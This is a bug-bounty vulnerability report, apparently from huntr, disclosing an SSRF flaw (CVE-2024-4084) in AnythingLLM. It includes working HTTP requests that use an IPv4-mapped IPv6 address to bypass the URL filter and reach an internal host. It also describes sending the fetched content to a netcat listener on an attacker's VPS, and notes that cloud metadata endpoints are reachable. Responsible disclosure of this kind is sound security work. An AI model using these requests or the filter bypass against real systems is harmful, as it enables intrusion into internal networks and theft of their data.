Title: AnythingLLM still has SSRF vulnerability in mintplex-labs/anything-llm

Proof of Concept: 
Test Environment

"My Anything-LLM server is running on the address 192.168.18.175, and the operating system is MacOS and Linux (not tested on Windows). Users can access the dashboard via the URL http://192.168.18.175:3000/ and http://192.168.18.175:3001/."

Assume that in the intranet where the Anything-LLM server is located, there is another web server running at http://192.168.18.220/. The page after accessing the web server is as follows.



Assuming that http://192.168.18.175 is accessible from anywhere on the internet, while http://192.168.18.220/ can only be accessed internally and its content cannot be accessed from external networks.

SSRF

(1) First, we create a Workspace named "ssrf_test":



(2) Then, the attacker can send the following HTTP request to access port 80 of 192.168.18.220 through SSRF:：

POST /api/workspace/test_ssrf/upload-link HTTP/1.1
Host: 192.168.18.175:3001
Content-Length: 68
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.18.175:3001
Content-Type: application/json
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.18.175:3001/api/workspace/test/upload-link
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,ru;q=0.7,ja;q=0.6
Connection: close

{"link":"http://[0:0:0:0:0:ffff:192.168.18.220]","il1oep8s65":"="}



（3）Then, the attacker have to obtain name of submited link after conversion to JSON:

GET /api/system/local-files HTTP/1.1
Host: 192.168.18.175:3001
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,ru;q=0.7,ja;q=0.6
Connection: close



The obtained name is "url-::ffff:c0a8:12dc-855a03bf-8eaf-47c0-bd06-910c9f21d52a.json".

At this point, we enter the "My Documents" page of the ssrf_test workspace, and we can successfully see the document we just included through the link:





(4) In order to read the content from http://192.168.18.220/, we need to select the document, click on "Move 1 file to workspace", and then click on "Save and Embed". This operation is learned from the vulnerability report at https://huntr.com/bounties/263fd7eb-f9a9-4578-9655-0e28c609272f/. However, due to issues with my OpenAI API Keys, I directly started a listener on port 2333 on my VPS using netcat, and then set it as the Ollama Embedding Preference. (Otherwise, you can do things like https://huntr.com/bounties/263fd7eb-f9a9-4578-9655-0e28c609272f/ to obtain the results of SSRF output is very simple, regardless of which method is used.)





After saving the changes, we return to the "My Documents" page of the ssrf_test workspace, select the document, click on "Move 1 file to workspace", and then click on "Save and Embed".





Finally, the web content from http://192.168.18.220/ is successfully received on my VPS's netcat.

Impact: 
An attacker can use this vulnerability to access any asset on the internal network, attack web services on the internal network, scan hosts on the internal network, etc., and possibly access AWS metadata endpoints (refer to https://huntr.com/bounties/07d83b49-7ebb-40d2-83fc-78381e3c5c9c/).

CVE ID: CVE-2024-4084
Status: (published)
Vulnerability Type: CWE-918: Server-Side Request Forgery (SSRF)
Severity: High (7.7)
Attack Vector: Network
Attack Complexity: Low
Privileges Required: Low
User Interaction: None
Scope: Changed
Confidentiality: High
Integrity: None
Availability: None
Registry: Packagist
Affected Version: latest
Visibility: Public
Status: Awaiting fix
Disclosure Bounty: $450
Fix Bounty: $112.5
